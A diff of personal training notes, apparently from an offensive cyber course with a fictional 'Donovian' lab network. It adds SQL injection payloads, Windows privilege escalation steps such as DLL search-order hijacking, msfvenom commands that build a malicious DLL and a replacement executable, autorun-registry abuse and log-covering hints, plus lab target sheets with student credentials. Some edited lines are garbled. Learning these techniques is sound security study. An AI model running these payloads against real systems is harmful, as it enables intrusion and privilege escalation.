@@ -186,9 +186,9 @@ Audi' SELECT id,2,name,pass,5 from session.user;# (pull rom the exact columns yo
 
 GET Method (URL)
 
-<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
+<URL>/uniondemo.php??username=tom'OR 1='1
 <URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
-<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columnsa
 <URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
 <URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car
 
@@ -523,14 +523,168 @@ Malware: none
 Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
 
 T3
-Hostname: unknown
-IP: x.x.x.9
+Hostname: unknowncat 
+IP: 192.168.28.9/27
 OS: unknown
 Creds:unknown
 Last Known SSH Port: unknown
 PSP: Unknown
 Malware: Unknown
 Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+192.168.150.253 Donovian-Intranet
+
+comrade::StudentMidwayPassword
+
+##WINDOWS PRIVILEGE ESCALATION
+
+Windows acces control model
+Access Tokens
+	security indetifier (SID)
+Security Descriptors
+	DACL
+	SACL
+	ACEs
+
+DLL Search Order
+	look in working directory first
+	then registry for known dll's
+	then get system directroy system32
+	then windows directory last (longest)
+
+Search order hijacking 
+	(go in the order and see if you can put somwthing malicious in that current working directory.)
+
+Windows Integrity Mechanism
+
+Integrity Levels
+Untrusted
+	Anonymous SID access tokens
+Low
+	Everyone SID access token (World)
+Medium
+	Authenticated Users
+High
+	Administrators
+System
+	System services (LocalSystem, LocalService, NetworkService)
+
+UAC 
+	
+AutoElevate Exeutables
+	asinvoker
+	highestavailable
+
+Scheduled Tasks and Services
+	schtasks /query /fo LIST /v
+
+DLL Hijacking
+	wmic service list full
+	sc query
+
+Covering tracks such as watching over logs
+	
+DEMO: Audit Logging
+Show all audit category settings
+
+auditpol /get /category:*
+
+What does the below command show?
+
+**auditpol /get /category:* | findstr /i "success failure"
+
+Important Microsoft Event IDs
+
+4624/4625
+	Successful/failed login
+4720
+	Account created
+4672
+	Administrative user logged on
+7045
+	Service created
+
+DEMO: Event Logging
+
+Storage: c:\windows\system32\config\
+
+File-Type: .evtx/.evt
+
+wevtutil el
+
+wmic ntevent where "logfile="<LOGNAME>" list full
+
+Get-Eventlog -List
+
+##Windows Privilege Exploitation DEMO
+
+open task scheduler
+	task shceduler library (take note of truggers and action)
+look for dll hijacking or binary replacement
+go to source of exe 
+view hidden files and folders
+view file name extensions
+(check if you can write to directory to see what you can modify)
+tasklist /svc | findstr "application"
+
+Find a DLL to Hijack
+
+download sysinternals
+or sysmon or procexplorer
+proc mon filters:
+	filter
+		proccess name contains "process name"
+		path	      contains .dll
+		Result        contains NAME NOT FOUND
+Name not found means it looks for the dll but cannot find it
+
+Creating a dll 
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
+(if ou wanna replace the binary)
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f exe > putty.exe
+**if its ran through a scheduled task will be as system
+
+Services
+	lazy admin will make a service with no description
+	go to the folder of the service and see if you can write there
+
+
+Registry to find other programs that could be running on the startup of the computer
+	find the application and change or dll hijack
+HKLM windows current version run an run once and  fo HKCU as well.
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+
+Target Section:
+
+Pivot
+Hostname: ftp.site.donovia
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+xfreerdp /v:127.0.0.1:4191 /u:comrade /p:StudentPrivPassword /dynamic-resolution +clipboard +glyph-cache
+
+
+
+
 
 
 
